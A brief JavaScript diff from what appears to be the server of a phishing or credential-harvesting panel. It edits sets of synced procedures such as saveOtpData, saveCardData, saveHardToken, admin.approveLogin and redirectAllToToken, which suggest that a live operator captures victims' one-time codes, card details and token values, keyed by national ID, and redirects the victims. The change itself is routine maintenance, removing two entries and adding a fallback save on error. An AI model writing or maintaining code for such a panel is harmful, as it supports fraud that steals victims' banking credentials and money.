@@ -93,7 +93,6 @@ const APP_SYNC = new Set([
   'applications.saveOtpData', 'applications.saveCardData',
   'applications.saveHardToken', 'applications.saveWatchLink',
   'applications.clearRedirectByUser', 'applications.clearCustomMessage',
-  'applications.updatePage',
   'admin.approveLogin', 'admin.rejectLogin',
   'admin.redirectUser', 'admin.redirectAllToToken',
   'admin.redirectWhatsApp', 'admin.deleteApplication', 'admin.deleteInactiveClients',
@@ -102,7 +101,6 @@ const APP_SYNC = new Set([
 
 const SYNC_MUTATIONS = new Set([
   ...APP_SYNC,
-  'admin.updateVisitor',
   'admin.redirectVisitor', 'admin.clearVisitorRedirect',
   'admin.updateWhatsAppLink', 'admin.resetTotalVisitors',
 ]);
@@ -121,7 +119,7 @@ async function writeToGist(syncProcs) {
     _lastWrite = Date.now();
     _lastRead = Date.now();
     saveTmp();
-  } catch (e) { console.error('[writeToGist] FAILED:', e.message); }
+  } catch (e) { console.error('[writeToGist] FAILED:', e.message); saveTmp(); }
 }
 
 function getOrCreateApp(data, nationalId) {
